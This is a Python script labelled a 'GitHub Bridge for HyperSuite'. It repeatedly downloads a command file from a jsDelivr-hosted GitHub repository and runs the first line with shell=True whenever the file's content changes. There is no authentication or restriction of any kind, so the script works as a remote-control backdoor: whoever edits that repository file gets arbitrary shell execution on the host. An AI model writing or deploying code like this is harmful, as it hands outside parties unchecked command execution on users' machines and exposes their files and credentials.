#!/usr/bin/env python3
"""
GitHub Bridge for HyperSuite
Polls jsDelivr CDN for commands - no SQLite, no locks, no conflicts
"""
import subprocess, time, os, hashlib, logging
import urllib.request, urllib.error

HOME = os.path.expanduser('~')
LOG = os.path.join(HOME, 'Clipper', 'bridge.log')
SEEN = os.path.join(HOME, 'Clipper', 'bridge_seen.txt')
CMD_URL = 'https://cdn.jsdelivr.net/gh/suhigto/flowbook-preview@main/scripts/current_command.txt'

os.makedirs(os.path.join(HOME, 'Clipper'), exist_ok=True)
logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s %(message)s')

def load_seen():
    try:
        return open(SEEN).read().strip()
    except:
        return ''

def save_seen(h):
    try:
        open(SEEN, 'w').write(h)
    except:
        pass

seen = load_seen()
logging.info('GitHub-bridge started - polling jsDelivr')

while True:
    try:
        req = urllib.request.Request(
            CMD_URL,
            headers={'User-Agent': 'HyperSuite-Bridge/2.0', 'Cache-Control': 'no-cache'}
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            content = resp.read().decode('utf-8').strip()

        lines = [l.strip() for l in content.split('\n')
                 if l.strip() and not l.strip().startswith('#')]

        if lines:
            cmd = lines[0]
            h = hashlib.md5(content.encode()).hexdigest()
            if h != seen:
                seen = h
                save_seen(h)
                logging.info(f'CMD: {cmd[:120]}')
                subprocess.Popen(cmd, shell=True)
                logging.info('Dispatched OK')

        time.sleep(10)
    except Exception as e:
        logging.error(f'err: {e}')
        time.sleep(15)
